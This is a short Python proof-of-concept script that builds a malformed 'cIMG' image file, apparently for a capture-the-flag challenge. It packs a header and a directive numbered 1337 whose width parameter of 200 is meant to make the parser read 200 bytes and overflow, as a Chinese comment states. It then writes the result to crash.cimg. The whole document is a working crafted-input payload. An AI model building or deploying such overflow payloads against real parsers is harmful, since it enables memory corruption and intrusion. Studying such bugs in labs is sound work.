import struct
magic = b"cIMG"
version = 4
reserved = 0
directive_count = 1
# 1337 指令 + 5字节参数 (x=0, y=0, width=200, height=1，读取200字节引发溢出)
payload = struct.pack("<4sHHI", magic, version, reserved, directive_count)
payload += struct.pack("<HBBBBB", 1337, 0, 0, 0, 200, 1)

with open("crash.cimg", "wb") as f:
    f.write(payload)
